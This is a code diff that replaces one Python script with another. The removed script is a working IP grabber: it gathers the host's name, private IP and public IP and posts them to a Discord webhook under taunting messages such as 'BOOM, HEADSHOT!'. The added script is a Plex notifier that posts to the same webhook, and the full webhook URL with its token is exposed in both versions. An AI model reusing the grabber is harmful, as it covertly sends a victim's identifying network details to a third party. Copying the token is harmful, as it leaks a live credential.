@@ -1,46 +1,46 @@
 import json
 import requests
-import time
-import socket
-import subprocess
 
-computer_name = socket.gethostname()
-private_ip = socket.gethostbyname(socket.gethostname())
-public_ip = requests.get('https://ifconfig.me/ip').text.strip()
-webhook_url = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"
+# Discord webhook URL
+discord_webhook_url = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"
 
-embed = {
-    "title": "BOOM, HEADSHOT!",
-    "description": computer_name,
-    "color": 16711680,
-    "fields": [
-        {
-            "name": "IP Addresses",
-            "value": f"Public IP: {public_ip}\nPrivate IP: {private_ip}",
-            "inline": False
-        }
-    ],
-    "footer": {
-        "text": "360 FUCKING NOSCOPED!",
-        "icon_url": "https://imgur.com/jWr67J8"
+def send_discord_message(title, user):
+    # Create the message payload
+    message = {
+        "username": "Plex Bot",
+        "avatar_url": "https://i.imgur.com/g3ZvNSm.png",
+        "embeds": [
+            {
+                "title": f"{user} is now watching {title}",
+                "color": 6570404
+            }
+        ]
     }
-}
+    
+    # Send the message to the Discord webhook
+    response = requests.post(discord_webhook_url, json=message)
+    
+    # Check the response status code
+    if response.status_code == 204:
+        print("Discord message sent successfully")
+    else:
+        print(f"Error sending Discord message: {response.text}")
 
-payload = {
-    "username": "Sniped looser",
-    "embeds": [
-        embed
-    ]
-}
-headers = {
-    "Content-Type": "application/json"
-}
+def handle_webhook(payload):
+    # Extract the relevant data from the webhook payload
+    event = payload['event']
+    user = payload['Account']['title']
+    
+    # Check if the event is a "media.play" event for a movie
+    if event['type'] == "media.play" and event['Metadata']['type'] == "movie":
+        title = event['Metadata']['title']
+        send_discord_message(title, user)
 
-# Send the webhook
-response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
-
-# Check the response
-if response.status_code == 204:
-    time.sleep(0)
-else:
-    print(f"Critical Error!: {response.status_code}")
+# Listen for incoming Plex webhooks
+while True:
+    try:
+        # Wait for incoming webhook data
+        payload = json.loads(input())
+        handle_webhook(payload)
+    except:
+        pass
